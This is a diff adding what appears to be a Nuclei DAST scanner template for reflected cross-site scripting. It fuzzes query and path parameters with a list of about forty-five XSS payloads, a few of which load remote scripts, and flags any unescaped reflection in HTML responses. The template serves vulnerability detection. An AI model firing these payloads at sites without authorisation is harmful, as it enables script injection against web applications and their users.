@@ -1,0 +1,92 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<output onclick=\"alert(1)\">test</output>"
+        - "<script>alert(1)</script>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></script>"
+        - "<style>:target {color:red;}</style><pre id=x style=\"transition:color 10s\" ontransitionrun=alert(1)></pre>"
+        - "<dl draggable=\"true\" ondragend=\"alert(1)\">test</dl>"
+        - "&lt;SCRIPT SRC=http://ha.ckers.org/ie-5.0.js&gt;&lt;/SCRIPT&gt;"
+        - "<img src=\"http://hacker.png\" onerror=javascript:alert(1)//>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>"
+        - "<script id=xss>document.vulnerable=true;</script><br />"
+        - "<html id=x tabindex=1 onbeforeactivate=alert(1)></html><input autofocus>"
+        - "<iframe draggable=\"true\" ondragleave=\"alert(1)\">test</iframe>"
+        - "<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\">"
+        - "<mark draggable=\"true\" ondragend=\"alert(1)\">test</mark>"
+        - "<ul oncopy=\"alert(1)\" contenteditable>test</ul>"
+        - "<time onkeydown=\"alert(1)\" contenteditable>test</time>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>"
+        - "<xmp draggable=\"true\" ondragend=\"alert(1)\">test</xmp>"
+        - "<form onkeydown=\"alert(1)\" contenteditable>test</form>"
+        - "<svg><image onload=alert(1) src=valid image>"
+        - "<style>@keyframes x{}</style><col style=\"animation-name:x\" onanimationend=\"alert(1)\"></col>"
+        - "<body draggable=\"true\" ondragend=\"alert(1)\">test</body>"
+        - "<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>"
+        - "<svg/onload=\"alert(1)\">"
+        - "<font oncut=\"alert(1)\" contenteditable>test</font>"
+        - "<svg><script xlink:href=\"data:text/html;base64=PHN2Zy9pZD0=bWxvc3QoMik+\"></script></svg>"
+        - "<nobr onkeyup=\"alert(1)\" contenteditable>test</nobr>"
+        - "<basefont oncopy=\"alert(1)\" contenteditable>test</basefont>"
+        - "<script type=\"text/javascript\">alert('xss')</script>"
+        - "<marquee onmouseenter=\"alert(1)\">test</marquee>"
+        - "<style>@keyframes slidein {}</style><input style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></input>"
+        - "<plaintext draggable=\"true\" ondragenter=\"alert(1)\">test</plaintext>"
+        - "&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"&lt;javascript:alert(1)\"&gt;&lt;/OBJECT&gt;"
+        - "<iframe src=\"http://xss-payload-list.html5sec.org/xss.js\"></iframe>"
+        - "<svg><circle onload=alert(1)></circle>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>"
+        - "<picture onkeydown=\"alert(1)\" contenteditable>test</picture>"
+        - "<mark id=x tabindex=1 onfocusin=alert(1)></mark>"
+        - "<optgroup draggable=\"true\" ondragend=\"alert(1)\">test</optgroup>"
+        - "<style>@keyframes slidein {}</style><pre style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></pre>"
+        - "<p onmouseup=\"alert(1)\">test</p>"
+        - "<script>alert(\"XSS\");</script><u onmouseenter=\"alert(1)\">test</u>"
+        - "<body id=x tabindex=1 onfocusin=alert(1)></body>"
+        - "<track onbeforecut=\"alert(1)\" contenteditable>test</track>"
+        - "<menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
